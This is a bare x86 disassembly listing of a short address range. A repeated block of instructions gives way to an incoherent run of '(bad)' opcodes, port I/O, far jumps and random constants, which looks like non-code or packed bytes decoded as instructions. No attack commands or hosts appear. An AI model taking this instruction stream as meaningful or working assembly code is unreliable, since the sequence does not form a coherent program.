  421b0e:	loop   0x421aa6
  421b10:	ds out dx,eax
  421b12:	shl    DWORD PTR [edx-0xf],0xa3
  421b16:	das    
  421b17:	ret    
  421b18:	cmp    al,0xaf
  421b1a:	xchg   edx,eax
  421b1b:	loop   0x421ab3
  421b1d:	ds out dx,eax
  421b1f:	shl    DWORD PTR [edx-0xf],0xa3
  421b23:	das    
  421b24:	ret    
  421b25:	cmp    al,0xaf
  421b27:	xchg   edx,eax
  421b28:	loop   0x421ac0
  421b2a:	ds out dx,eax
  421b2c:	shl    DWORD PTR [edx-0xf],0xa3
  421b30:	das    
  421b31:	ret    
  421b32:	cmp    al,0xaf
  421b34:	xchg   edx,eax
  421b35:	loop   0x421acd
  421b37:	ds out dx,eax
  421b39:	shl    DWORD PTR [edx-0xf],0xa3
  421b3d:	das    
  421b3e:	ret    
  421b3f:	cmp    al,0xaf
  421b41:	xchg   edx,eax
  421b42:	loop   0x421ada
  421b44:	ds out dx,eax
  421b46:	shl    DWORD PTR [edx-0xf],0xa3
  421b4a:	das    
  421b4b:	ret    
  421b4c:	cmp    al,0xaf
  421b4e:	xchg   edx,eax
  421b4f:	loop   0x421ae7
  421b51:	ds out dx,eax
  421b53:	shl    DWORD PTR [edx-0xf],0xa3
  421b57:	das    
  421b58:	ret    
  421b59:	cmp    al,0xaf
  421b5b:	xchg   edx,eax
  421b5c:	loop   0x421af4
  421b5e:	ds out dx,eax
  421b60:	shl    DWORD PTR [edx-0xf],0xa3
  421b64:	das    
  421b65:	ret    
  421b66:	cmp    al,0xaf
  421b68:	xchg   edx,eax
  421b69:	loop   0x421b01
  421b6b:	ds out dx,eax
  421b6d:	shl    DWORD PTR [edx-0xf],0xa3
  421b71:	das    
  421b72:	ret    
  421b73:	cmp    al,0xaf
  421b75:	xchg   edx,eax
  421b76:	loop   0x421b0e
  421b78:	ds out dx,eax
  421b7a:	shl    DWORD PTR [edx-0xf],0xa3
  421b7e:	das    
  421b7f:	ret    
  421b80:	cmp    al,0xaf
  421b82:	xchg   edx,eax
  421b83:	loop   0x421b1b
  421b85:	ds out dx,eax
  421b87:	shl    DWORD PTR [edx-0xf],0xa3
  421b8b:	das    
  421b8c:	ret    
  421b8d:	cmp    al,0xaf
  421b8f:	xchg   edx,eax
  421b90:	loop   0x421b28
  421b92:	ds out dx,eax
  421b94:	shl    DWORD PTR [edx-0xf],0xa3
  421b98:	das    
  421b99:	ret    
  421b9a:	cmp    al,0xaf
  421b9c:	xchg   edx,eax
  421b9d:	loop   0x421b35
  421b9f:	ds out dx,eax
  421ba1:	shl    DWORD PTR [edx-0xf],0xa3
  421ba5:	das    
  421ba6:	ret    
  421ba7:	cmp    al,0xaf
  421ba9:	xchg   edx,eax
  421baa:	loop   0x421b42
  421bac:	ds out dx,eax
  421bae:	shl    DWORD PTR [edx-0xf],0xa3
  421bb2:	das    
  421bb3:	ret    
  421bb4:	cmp    al,0xaf
  421bb6:	xchg   edx,eax
  421bb7:	loop   0x421b4f
  421bb9:	ds out dx,eax
  421bbb:	shl    DWORD PTR [edx-0xf],0xa3
  421bbf:	das    
  421bc0:	ret    
  421bc1:	cmp    al,0xaf
  421bc3:	xchg   edx,eax
  421bc4:	loop   0x421b5c
  421bc6:	ds out dx,eax
  421bc8:	shl    DWORD PTR [edx-0xf],0xa3
  421bcc:	das    
  421bcd:	ret    
  421bce:	cmp    al,0xaf
  421bd0:	xchg   edx,eax
  421bd1:	loop   0x421b69
  421bd3:	ds out dx,eax
  421bd5:	shl    DWORD PTR [edx-0xf],0xa3
  421bd9:	das    
  421bda:	ret    
  421bdb:	cmp    al,0xaf
  421bdd:	xchg   edx,eax
  421bde:	loop   0x421b76
  421be0:	ds out dx,eax
  421be2:	shl    DWORD PTR [edx-0xf],0xa3
  421be6:	das    
  421be7:	ret    
  421be8:	cmp    al,0xaf
  421bea:	xchg   edx,eax
  421beb:	loop   0x421b83
  421bed:	ds out dx,eax
  421bef:	shl    DWORD PTR [edx-0xf],0xa3
  421bf3:	das    
  421bf4:	ret    
  421bf5:	cmp    al,0xaf
  421bf7:	xchg   edx,eax
  421bf8:	loop   0x421b90
  421bfa:	ds out dx,eax
  421bfc:	shl    DWORD PTR [edx-0xf],0xa3
  421c00:	das    
  421c01:	ret    
  421c02:	cmp    al,0xaf
  421c04:	xchg   edx,eax
  421c05:	loop   0x421b9d
  421c07:	ds out dx,eax
  421c09:	shl    DWORD PTR [edx-0xf],0xa3
  421c0d:	das    
  421c0e:	ret    
  421c0f:	cmp    al,0xaf
  421c11:	xchg   edx,eax
  421c12:	loop   0x421baa
  421c14:	ds out dx,eax
  421c16:	shl    DWORD PTR [edx-0xf],0xa3
  421c1a:	das    
  421c1b:	ret    
  421c1c:	cmp    al,0xaf
  421c1e:	xchg   edx,eax
  421c1f:	loop   0x421bb7
  421c21:	ds out dx,eax
  421c23:	shl    DWORD PTR [edx-0xf],0xa3
  421c27:	das    
  421c28:	ret    
  421c29:	cmp    al,0xaf
  421c2b:	xchg   edx,eax
  421c2c:	loop   0x421bc4
  421c2e:	push   ecx
  421c2f:	inc    edi
  421c30:	retf   0xde62
  421c33:	mov    ds:0xaf3cd32f,eax
  421c38:	mov    eax,0x894f4c40
  421c3d:	ds dec edi
  421c3f:	outs   dx,DWORD PTR ds:[esi]
  421c40:	and    al,0x7f
  421c42:	or     al,BYTE PTR cs:[edi-0x7f]
  421c46:	push   esi
  421c47:	add    ebx,DWORD PTR [eax-0x62]
  421c4a:	inc    ebp
  421c4b:	cmp    dl,ah
  421c4d:	adc    bl,BYTE PTR [eax+0x184b51d5]
  421c53:	arpl   WORD PTR [eax+0x10],dx
  421c56:	lea    edx,[ecx+0x5d]
  421c59:	enter  0x6090,0x72
  421c5d:	sub    ecx,DWORD PTR [ebp-0x49ce3a6e]
  421c63:	mov    edx,0x91580f90
  421c68:	adc    bl,BYTE PTR [esi]
  421c6a:	sub    BYTE PTR [esi],bl
  421c6c:	repnz in eax,dx
  421c6e:	dec    eax
  421c6f:	sbb    dl,BYTE PTR [ebp+ecx*4-0x4f]
  421c73:	xor    al,0x8c
  421c75:	xlat   BYTE PTR ds:[ebx]
  421c76:	pop    ebp
  421c77:	ss inc eax
  421c79:	test   dl,0x35
  421c7c:	xor    DWORD PTR [esi],ebx
  421c7e:	imul   ecx,DWORD PTR [edi-0x4c],0xffffffdb
  421c82:	imul   edx,DWORD PTR [edx-0x5bdc9e81],0x407243bf
  421c8c:	cmp    BYTE PTR [ebx],dl
  421c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c8f:	fwait
  421c90:	inc    ecx
  421c91:	pinsrw mm6,WORD PTR [esi-0x3d],0x66
  421c96:	pop    edi
  421c97:	mov    eax,fs:0xc88fe5c4
  421c9d:	push   0xdd75e414
  421ca2:	ss and eax,0xb7d873b0
  421ca8:	pop    ds
  421ca9:	push   esp
  421caa:	jmp    0xf2a7:0xd36d817e
  421cb1:	pop    eax
  421cb2:	into   
  421cb3:	or     al,0x53
  421cb5:	std    
  421cb6:	xchg   edx,eax
  421cb7:	out    dx,al
  421cb8:	ss jmp 0xa5dc:0xb1df7756
  421cc0:	jno    0x421c47
  421cc2:	and    al,0x7
  421cc4:	and    DWORD PTR [eax+0x29],0x3464cf2f
  421ccb:	arpl   WORD PTR [eax-0x7f5abd86],dx
  421cd1:	mov    esp,ecx
  421cd3:	mov    ch,0x1b
  421cd5:	mov    ds:0x77c326d9,al
  421cda:	mov    BYTE PTR [ecx-0x27],cl
  421cdd:	add    edx,DWORD PTR [ebp-0x33]
  421ce0:	and    al,bh
  421ce2:	rol    BYTE PTR [ebx+0x9b4e814],cl
  421ce8:	add    edx,DWORD PTR [ebx]
  421cea:	adc    DWORD PTR [ecx-0x1],edx
  421ced:	outs   dx,BYTE PTR fs:[esi]
  421cef:	jmp    0x421c79
  421cf1:	mov    esp,0xd2d61c2d
  421cf6:	dec    esp
  421cf7:	sbb    BYTE PTR [ebp*8+0x58b4ba20],0xe2
  421cff:	jnp    0x421cd7
  421d01:	sbb    ah,cl
  421d03:	push   ebp
  421d04:	and    DWORD PTR [eax+ecx*8+0x3b69810f],eax
  421d0b:	cmp    DWORD PTR [eax+0x49],0x61
  421d0f:	lods   al,BYTE PTR ds:[esi]
  421d10:	dec    ebx
  421d11:	fdivr  DWORD PTR [ebx+0x480e32e]
  421d17:	push   0xea31bfd1
  421d1c:	or     BYTE PTR [eax+0x3e],0x37
  421d20:	loopne 0x421d70
  421d22:	mov    dl,0x80
  421d24:	dec    edx
  421d25:	daa    
  421d26:	retf   
  421d27:	mov    esp,0xac9f1828
  421d2c:	sbb    eax,DWORD PTR [edi]
  421d2e:	pushf  
  421d2f:	shl    DWORD PTR [edx+edi*8-0x17],0x18
  421d34:	gs (bad) 
  421d36:	ja     0x421d41
  421d38:	xor    DWORD PTR [eax+0x22d331f5],ecx
  421d3e:	mov    al,0xf0
  421d40:	dec    eax
  421d41:	jo     0x421d04
  421d43:	pop    DWORD PTR [edi]
  421d45:	jne    0x421d9a
  421d47:	shl    BYTE PTR [eax+0x295518e],0x76
  421d4e:	mov    ebp,0x2f3ac42f
  421d53:	pop    ss
  421d54:	cmp    eax,0x6735c9c6
  421d59:	test   eax,0x351844e0
  421d5e:	bound  ebx,QWORD PTR [esi]
  421d60:	cmp    BYTE PTR [esi-0x185ce897],dh
  421d66:	fld    st(1)
  421d68:	sbb    esp,DWORD PTR ds:0x62d61200
  421d6e:	sub    eax,0x62589761
  421d73:	dec    ebx
  421d74:	mov    eax,ds:0xf424560d
  421d79:	(bad)  
  421d7a:	mov    ebp,0xd338e3c8
  421d7f:	sbb    dl,BYTE PTR [edi+0x1d]
  421d82:	stc    
  421d83:	dec    ebp
  421d84:	mov    WORD PTR [esp+esi*4],es
  421d87:	int    0x12
  421d89:	lahf   
  421d8a:	cmp    cl,BYTE PTR [ecx+0x5fb214b]
  421d90:	cs aad 0x46
  421d93:	hlt    
  421d94:	stos   DWORD PTR es:[edi],eax
  421d95:	xor    esi,eax
  421d97:	add    BYTE PTR [ebp-0x38453971],ah
  421d9d:	out    dx,al
  421d9e:	xor    cl,BYTE PTR [edx+0x1e4baee9]
  421da4:	icebp  
  421da5:	pop    ebp
  421da6:	or     dl,BYTE PTR [ecx+ebp*2-0x6245d0fb]
  421dad:	pop    ecx
  421dae:	(bad)  
  421daf:	clc    
  421db0:	rol    edi,1
  421db2:	mov    cl,0x6a
  421db5:	ret    0xebcf
  421db8:	push   ecx
  421db9:	ds jae 0x421e25
  421dbc:	in     eax,dx
  421dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dbe:	xchg   esp,eax
  421dbf:	int3   
  421dc0:	in     eax,0x81
  421dc2:	adc    DWORD PTR [ecx-0x41ea71d6],esi
  421dc8:	lea    ebp,[eax+0x18]
  421dcb:	call   0x40c5:0xa9f9e492
  421dd2:	mov    BYTE PTR [eax],cl
  421dd4:	or     eax,0xaf8525a0
  421dd9:	or     eax,0xa8564070
  421dde:	loopne 0x421dda
  421de0:	out    0x49,al
  421de2:	mov    dl,0xba
  421de4:	cmp    eax,0x44378b6d
  421de9:	add    edx,DWORD PTR [edi]
  421deb:	inc    eax
  421dec:	mov    edx,0x23a2bdde
  421df1:	jmp    0x4b71:0x969b1e9c
  421df8:	pusha  
  421df9:	mov    ah,0x33
  421dfb:	push   edi
  421dfc:	ret    
  421dfd:	imul   eax,esi,0x1f402615
  421e03:	jno    0x421e1f
  421e05:	out    dx,eax
  421e06:	div    BYTE PTR ds:0xff2a74f5
  421e0c:	or     DWORD PTR [ebp+0x40],ebx
  421e0f:	mov    ds:0x4b0aafeb,eax
  421e14:	leave  
  421e15:	(bad)  
  421e16:	cdq    
  421e17:	inc    eax
  421e18:	ja     0x421de2
  421e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e1b:	arpl   WORD PTR [edi+0x8519270],di
  421e21:	adc    al,BYTE PTR [edi+ecx*4-0x6ea28550]
  421e28:	push   esp
  421e29:	inc    edi
  421e2a:	(bad)  
  421e2b:	and    ebp,DWORD PTR [edi+0x1c]
  421e2e:	mov    ds:0xe0d4ed0d,eax
  421e34:	push   0xffffffee
  421e36:	mov    dh,0x23
  421e38:	cmp    bl,BYTE PTR [ebx+0x38]
  421e3b:	and    ecx,edx
  421e3d:	rcl    BYTE PTR [esi+0x5b],0xde
  421e41:	das    
  421e42:	mov    DWORD PTR ds:0x5b7bf829,ecx
  421e48:	mov    edi,0x20f645ec
  421e4d:	cs jmp 0x6f404b0d
  421e53:	sub    al,0xb4
  421e55:	cmp    eax,DWORD PTR [ecx]
  421e57:	xchg   edi,eax
  421e58:	loope  0x421e3c
  421e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e5b:	xchg   ecx,eax
  421e5c:	mov    bh,bl
  421e5e:	lods   al,BYTE PTR ds:[esi]
  421e5f:	int    0x39
  421e61:	adc    DWORD PTR [edi-0x68e41e67],edi
  421e67:	mov    WORD PTR [ebp-0x29],gs
  421e6a:	or     BYTE PTR [ebp+esi*4-0x6688781],0x54
  421e72:	jecxz  0x421e64
  421e74:	xor    eax,0x10f2e8d0
  421e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e7b:	mov    al,ds:0x4868e4a
  421e80:	test   eax,0x7e3d999d
  421e85:	leave  
  421e86:	mov    ch,0xbb
  421e88:	test   eax,0x3d813400
  421e8d:	stc    
  421e8e:	dec    esi
  421e8f:	out    dx,al
  421e90:	leave  
  421e91:	scas   eax,DWORD PTR es:[edi]
  421e92:	fild   QWORD PTR [ebx+0x7]
  421e95:	in     al,dx
  421e96:	sahf   
  421e97:	ins    BYTE PTR es:[edi],dx
  421e98:	cmp    eax,edx
  421e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e9c:	stc    
  421e9d:	cmc    
  421e9e:	add    DWORD PTR [eax],ecx
  421ea0:	cmp    cl,al
  421ea2:	add    eax,0xc2ba3adc
  421ea7:	call   DWORD PTR [ebp+0x4076597a]
  421ead:	sbb    cl,BYTE PTR [eax+0x7fd3df9d]
  421eb3:	jl     0x421ef3
  421eb5:	inc    esi
  421eb6:	fcomp  DWORD PTR [ebp+0x1963fb84]
  421ebc:	cmp    eax,0xd6b79bc5
  421ec1:	aas    
  421ec2:	in     eax,dx
  421ec3:	test   eax,0x79977446
  421ec8:	out    0x2,al
  421eca:	dec    edi
  421ecb:	inc    ebp
  421ecc:	fdivr  QWORD PTR [ebx-0x7652eb1d]
  421ed2:	fnstcw WORD PTR [esi-0x5c989594]
  421ed8:	xchg   edx,eax
  421ed9:	pop    edx
  421eda:	xchg   esi,eax
  421edb:	fcomp  DWORD PTR [eax]
  421edd:	clc    
  421ede:	push   ds
  421edf:	cmp    al,0xe6
  421ee1:	or     BYTE PTR [edx-0x7f249425],0x75
  421ee8:	adc    al,0xc1
  421eea:	mov    dh,0x3a
  421eec:	push   cs
  421eed:	inc    esp
  421eee:	ficom  DWORD PTR [edx]
  421ef0:	adc    al,0xb4
  421ef2:	push   esi
  421ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ef4:	repnz and bh,bh
  421ef7:	hlt    
  421ef8:	fcomi  st,st(0)
  421efa:	push   0xb0a9b12a
  421eff:	js     0x421ea8
  421f01:	ds mov esi,0xb517992a
  421f07:	dec    ebx
  421f08:	cmp    esi,DWORD PTR [ebp-0x2f]
  421f0b:	cmp    edx,ebp
  421f0d:	jmp    0x421ef3
  421f0f:	sub    ebp,eax
  421f11:	adc    eax,0xc2405e81
  421f16:	icebp  
  421f17:	mov    eax,ds:0xd4c43cc6
  421f1c:	push   eax
  421f1d:	jbe    0x421f57
  421f1f:	xchg   ecx,eax
  421f20:	inc    eax
  421f21:	dec    ebp
  421f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f23:	jo     0x421ea9
  421f25:	xlat   BYTE PTR ds:[ebx]
  421f26:	nop
  421f27:	popf   
  421f28:	fdivr  st,st(0)
  421f2a:	adc    BYTE PTR [edx+0x7c],bh
  421f2d:	in     eax,0xd9
  421f2f:	pusha  
  421f30:	mov    bl,BYTE PTR [ecx]
  421f32:	mov    ebp,0xb0214347
  421f37:	in     eax,0x81
  421f39:	jle    0x421f71
  421f3b:	enter  0x9451,0x2f
  421f3f:	adc    ah,BYTE PTR [edi-0x4f134041]
  421f45:	retf   
  421f46:	dec    ebp
  421f47:	mov    ah,cl
  421f49:	idiv   DWORD PTR [eax+0x7b]
  421f4c:	mov    ch,0x3a
  421f4e:	sar    edx,1
  421f50:	sub    bh,BYTE PTR [edx+0xa65821]
  421f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f57:	dec    edi
  421f58:	test   DWORD PTR [edi+0x4a],0x4f274333
  421f5f:	mov    cl,0x3d
  421f61:	pop    ecx
  421f62:	xlat   BYTE PTR ds:[ebx]
  421f63:	or     ecx,DWORD PTR [esp+ebx*8]
  421f66:	jg     0x421f71
  421f68:	int    0xf5
  421f6a:	jae    0x421f41
  421f6c:	jg     0x421f7f
  421f6e:	jl     0x421fa3
  421f70:	sbb    al,0x2e
  421f72:	mov    bh,0xf4
  421f74:	iret   
  421f75:	push   ebx
  421f76:	(bad)  
  421f77:	outs   dx,BYTE PTR ds:[esi]
  421f78:	gs pop edi
  421f7a:	cwde   
  421f7b:	xchg   BYTE PTR [ebx+0x3f2e90d8],ch
  421f81:	xchg   esp,eax
  421f82:	or     al,0x11
  421f84:	or     al,ah
  421f86:	mov    ds:0xed38160a,al
  421f8b:	in     al,dx
  421f8c:	xchg   ebp,eax
  421f8d:	pop    edi
  421f8e:	cmp    BYTE PTR [esp],0x69
  421f92:	jp     0x421fd7
  421f94:	sahf   
  421f95:	xor    DWORD PTR [ecx+0x33],ebx
  421f98:	ins    BYTE PTR es:[edi],dx
  421f99:	mov    ebp,DWORD PTR [ebx+0x12b575f4]
  421f9f:	jnp    0x421ff5
  421fa1:	xchg   ecx,eax
  421fa2:	mov    ?,WORD PTR [ebx+0x498e3a8b]
  421fa8:	pop    eax
  421fa9:	enter  0x1e13,0xac
  421fad:	aam    0x47
  421faf:	cmc    
  421fb0:	loop   0x421f4f
  421fb2:	xor    dh,BYTE PTR [ebx+0x4e]
  421fb5:	lock js 0x422029
  421fb8:	dec    ebx
  421fb9:	xor    DWORD PTR [esi+0x4c78b571],ecx
  421fbf:	je     0x421fc1
  421fc1:	jae    0x421f72
  421fc3:	shl    BYTE PTR [esi-0xb],1
  421fc6:	dec    edi
  421fc7:	in     al,0xc4
  421fc9:	pop    edi
  421fca:	mov    dl,0x22
  421fcc:	cmp    eax,0x2ac13550
  421fd1:	inc    ecx
  421fd2:	adc    al,0xdf
  421fd4:	xchg   esp,eax
  421fd5:	add    eax,0x596182b4
  421fda:	lahf   
  421fdb:	dec    eax
  421fdc:	cmp    DWORD PTR [eax],ebx
  421fde:	pop    edi
  421fdf:	inc    ebx
  421fe0:	add    DWORD PTR [ebx+esi*2+0x73123ee6],edx
  421fe7:	adc    BYTE PTR [ebp-0x29],0xd0
  421feb:	out    dx,eax
  421fec:	and    eax,0x661cba47
  421ff1:	out    0x7b,eax
  421ff3:	add    eax,0x78d5f709
  421ff8:	xchg   BYTE PTR [esi-0x4a],bl
  421ffb:	mov    esp,0xf77b4a1f
  422000:	(bad)  
  422001:	in     al,dx
  422002:	pop    ebx
  422003:	pop    ebp
  422004:	xor    al,0x29
  422006:	jne    0x42204c
  422008:	sub    edi,edx
  42200a:	adc    BYTE PTR [edi+0x2f],cl
  42200d:	vxorps ymm4,ymm2,YMMWORD PTR [ebp+edi*8+0x1b]
  422013:	xchg   ebp,eax
  422014:	sti    
  422015:	xor    edi,ebx
  422017:	sub    eax,0x63db185c
  42201c:	or     al,0xa7
  42201e:	push   edx
  42201f:	rcl    DWORD PTR [ebp-0x15],cl
  422022:	xor    al,0xe0
  422024:	xor    al,0x9e
  422026:	and    bh,BYTE PTR [eax+ebx*8-0x4a3c8c4]
  42202d:	call   0x19d215ba
  422032:	mov    al,0xf
  422034:	sbb    al,0xc1
  422036:	cdq    
  422037:	jbe    0x422007
  422039:	mov    dl,0xf7
  42203b:	vxorps xmm2,xmm0,XMMWORD PTR [ebp+ebx*4+0x17]
  422041:	lea    ecx,[eax+edx*1]
  422044:	mov    ah,0xda
  422046:	(bad)  
  422047:	push   esp
  422048:	aad    0xb5
  42204a:	mov    al,0x5a
  42204c:	dec    ecx
  42204d:	xor    eax,0xee7d6b64
  422052:	cmp    al,0x69
  422054:	jne    0x421fdd
  422056:	(bad)  
  422057:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422059:	or     DWORD PTR [edi+esi*2+0x18],0xad6f773
  422061:	pop    edx
  422062:	sti    
  422063:	pmaddwd mm2,QWORD PTR [esp+esi*4-0x67a730b4]
  42206b:	mov    al,0xf3
  42206d:	scas   eax,DWORD PTR es:[edi]
  42206e:	sub    eax,0xa000ebdc
  422073:	fstp   TBYTE PTR [ecx+0x65]
  422076:	jmp    0x422070
  422078:	sub    ebx,esp
  42207a:	xchg   esp,eax
  42207b:	dec    ebp
  42207c:	enter  0xc152,0x54
  422080:	sti    
  422081:	mov    ebx,0xc32de76b
  422086:	(bad)  
  422088:	and    BYTE PTR [eax-0x4adb3dcb],ch
  42208e:	out    dx,al
  42208f:	dec    esi
  422090:	add    ah,BYTE PTR [edx]
  422092:	jmp    0x39c3b5d1
  422097:	jno    0x4220e3
  422099:	test   eax,0x9bb5aae5
  42209e:	pop    ebp
  42209f:	inc    edi
  4220a0:	ins    BYTE PTR es:[edi],dx
  4220a1:	daa    
  4220a2:	lods   al,BYTE PTR ds:[esi]
  4220a3:	(bad)  
  4220a4:	jo     0x42202b
  4220a6:	bound  eax,QWORD PTR [ebx-0x17c32511]
  4220ac:	jl     0x422085
  4220ae:	mov    ebx,0x7859d15a
  4220b3:	nop
  4220b4:	ds dec edx
  4220b6:	pop    ebx
  4220b7:	sbb    DWORD PTR [eax-0x201c213a],0xe4a32139
  4220c1:	dec    eax
  4220c2:	mov    al,0x24
  4220c4:	jecxz  0x422102
  4220c6:	in     eax,dx
  4220c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220c8:	pop    edi
  4220c9:	mov    ds:0xda32421f,eax
  4220ce:	cmp    ebx,esp
  4220d0:	cdq    
  4220d1:	add    DWORD PTR [ebx],0x8fa59651
  4220d7:	add    ebp,ebp
  4220d9:	jp     0x42209f
  4220db:	nop
  4220dc:	daa    
  4220dd:	lods   al,BYTE PTR ds:[esi]
  4220de:	push   ss
  4220df:	(bad)  
  4220e0:	add    esi,DWORD PTR [edx+0x37]
  4220e3:	inc    ebx
  4220e4:	in     al,0xe
  4220e6:	mov    edx,0x5d65a02a
  4220eb:	outs   dx,BYTE PTR ds:[esi]
  4220ec:	push   ebp
  4220ed:	dec    esi
  4220ee:	mov    edi,0xdd2a4035
  4220f3:	pop    eax
  4220f4:	mov    edx,0x255bdc89
  4220f9:	mov    al,ds:0x91ac1e37
  4220fe:	jnp    0x4220f1
  422100:	aaa    
  422101:	or     ah,BYTE PTR [edx-0x49]
  422104:	push   eax
  422105:	out    0x0,eax
  422107:	es xchg ebx,eax
  422109:	push   ecx
  42210a:	mov    edx,0x933a44b0
  42210f:	cmc    
  422110:	call   FWORD PTR [edx+0x17d52061]
  422116:	ror    ah,0x27
  422119:	out    0x8d,eax
  42211b:	mov    dl,0xe7
  42211d:	jae    0x422175
  42211f:	clc    
  422120:	rcr    DWORD PTR [edx-0x7b],cl
  422123:	push   0x58
  422125:	imul   esp,edx,0xffffffb7
  422128:	mov    ah,0x7e
  42212a:	test   al,0xb3
  42212c:	fadd   QWORD PTR [ecx-0x7d]
  42212f:	mov    cs,WORD PTR [ebp+0x1b06b0a9]
  422135:	sti    
  422136:	mov    ds:0xeaec52c7,al
  42213b:	jl     0x422184
  42213d:	pop    eax
  42213e:	mov    edx,0x9b837b64
  422143:	fild   DWORD PTR [ecx+0x3d]
  422146:	inc    BYTE PTR [eax]
  422148:	xchg   edi,eax
  422149:	xor    eax,0x25cd4531
  42214e:	xor    bh,0xb9
  422151:	sbb    ebx,DWORD PTR [ecx+0x5c]
  422154:	xor    ah,BYTE PTR [edx-0x80]
  422157:	aas    
  422158:	sbb    BYTE PTR [edi+0x16972123],0x26
  42215f:	repz std 
  422161:	out    dx,al
  422162:	pop    ebp
  422163:	mov    ?,WORD PTR [esi+eiz*4]
  422166:	adc    BYTE PTR [ebx],dh
  422168:	and    esi,DWORD PTR [eax-0x449e3fa1]
  42216e:	fidiv  WORD PTR [eax]
  422170:	mov    esp,0x15cfa089
  422175:	imul   eax,eax,0x50
  422178:	or     eax,0x45c1344a
  42217d:	push   ebp
  42217e:	out    dx,eax
  42217f:	cli    
  422180:	sub    dh,BYTE PTR [esi-0x2d]
  422183:	xchg   ecx,eax
  422184:	pop    edi
  422185:	mov    dl,0xd2
  422187:	pushf  
  422188:	xchg   edx,eax
  422189:	fnstcw WORD PTR [esi+0x59]
  42218c:	adc    al,0x48
  42218e:	xchg   DWORD PTR [ebx+0x9],esp
  422191:	push   ds
  422192:	sub    al,BYTE PTR [ebx]
  422194:	or     al,0x54
  422196:	pop    edi
  422197:	into   
  422198:	(bad)  
  422199:	xlat   BYTE PTR ds:[ebx]
  42219a:	sub    DWORD PTR [edi-0x51],esi
  42219d:	inc    ebp
  42219e:	std    
  42219f:	add    BYTE PTR [edx+eax*8],0x7e
  4221a3:	or     eax,0xfac433d8
  4221a8:	push   es
  4221a9:	inc    esi
  4221aa:	pop    edx
  4221ab:	jae    0x422159
  4221ad:	and    al,0xf5
  4221af:	stos   DWORD PTR es:[edi],eax
  4221b0:	add    ah,BYTE PTR ds:0xf1062ce5
  4221b6:	ss out dx,al
  4221b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221b9:	aam    0xda
  4221bb:	or     al,bl
  4221bd:	and    ebp,DWORD PTR [esi]
  4221bf:	fild   QWORD PTR [edx+0x10ba9e3f]
  4221c5:	pop    eax
  4221c6:	pop    ds
  4221c7:	out    dx,al
  4221c8:	out    0x60,eax
  4221ca:	stc    
  4221cb:	inc    ebp
  4221cc:	mov    bh,0x12
  4221ce:	into   
  4221cf:	push   ds
  4221d0:	bound  ebp,QWORD PTR [edx*8+0x45900521]
  4221d7:	fild   WORD PTR ds:[esi+0x1f]
  4221db:	adc    ah,BYTE PTR [ecx-0x36]
  4221de:	mov    al,ds:0xf1b08a92
  4221e3:	jl     0x422236
  4221e5:	icebp  
  4221e6:	jae    0x4221be
  4221e8:	bound  ecx,QWORD PTR [edx+0x3a]
  4221eb:	mov    eax,ds:0xe699b8fb
  4221f0:	inc    ebx
  4221f1:	jmp    0xd5d3:0x6adcfc30
  4221f8:	ja     0x4221e3
  4221fa:	ret    
  4221fb:	sbb    eax,0xa5f182fa
  422200:	call   0xdd29:0x267cce49
  422207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422208:	lods   eax,DWORD PTR ds:[esi]
  422209:	fdivp  st(6),st
  42220b:	mov    eax,0x690bff56
  422210:	daa    
  422211:	test   esp,edx
  422213:	jp     0x4221f2
  422215:	fwait
  422216:	cmp    edi,DWORD PTR [eax]
  422218:	lahf   
  422219:	scas   eax,DWORD PTR es:[edi]
  42221a:	jne    0x422216
  42221c:	out    0x8e,eax
  42221e:	add    BYTE PTR [esp+edi*1],bh
  422221:	mov    eax,0x10da5d92
  422226:	jo     0x4221ab
  422228:	push   ss
  422229:	out    0x2c,al
  42222b:	stos   DWORD PTR es:[edi],eax
  42222c:	fwait
  42222d:	sbb    al,0x50
  42222f:	push   eax
  422230:	or     DWORD PTR [edi+0x12],edx
  422233:	or     eax,0xfc4b9b4
  422238:	enter  0x8b93,0x5
  42223c:	adc    edi,DWORD PTR [edx]
  42223e:	fild   QWORD PTR [eax]
  422240:	rcl    DWORD PTR [eax+0x19093b80],0x1c
  422247:	jecxz  0x4222b0
  422249:	and    BYTE PTR [eax+0x1473a2a4],ah
  42224f:	push   esp
  422250:	push   ss
  422251:	pop    ecx
  422252:	or     BYTE PTR [ecx],bh
  422254:	adc    eax,0x22cfc21c
  422259:	repnz (bad) 
  42225b:	mov    bl,0xd2
  42225d:	jp     0x422271
  42225f:	mov    edx,0x5d9cc3c3
  422264:	or     DWORD PTR [edx-0x75],0xcb4ba8d9
  42226b:	sar    BYTE PTR [ebx+0x8],cl
  42226e:	sbb    al,0x83
  422270:	xor    eax,0xde1cd957
  422275:	fs jb  0x422258
  422278:	pop    edx
  422279:	push   edi
  42227a:	xchg   esi,eax
  42227b:	(bad)
  42227f:	ror    BYTE PTR [edi-0x2642a21c],1
  422285:	data16 setp dl
  422289:	pop    ecx
  42228a:	sub    dl,bh
  42228c:	sub    BYTE PTR [edi-0x24],0x8a
  422290:	push   ebx
  422291:	mov    BYTE PTR [ebp+0x63],0x62
  422295:	sbb    cl,BYTE PTR [edi+0x7a]
  422298:	or     BYTE PTR [edx-0x63],cl
  42229b:	retf   0x47b6
  42229e:	inc    esi
  42229f:	dec    esi
  4222a0:	popa   
  4222a1:	sub    DWORD PTR gs:[ecx+0x57],ebx
  4222a5:	nop
  4222a6:	xchg   ebx,eax
  4222a7:	xor    edi,ebp
  4222a9:	hlt    
  4222aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222ab:	mov    ds:0x26babc1,eax
  4222b0:	nop
  4222b1:	adc    ah,BYTE PTR [ebp+0xa60f281]
  4222b7:	stos   DWORD PTR es:[edi],eax
  4222b8:	pop    esp
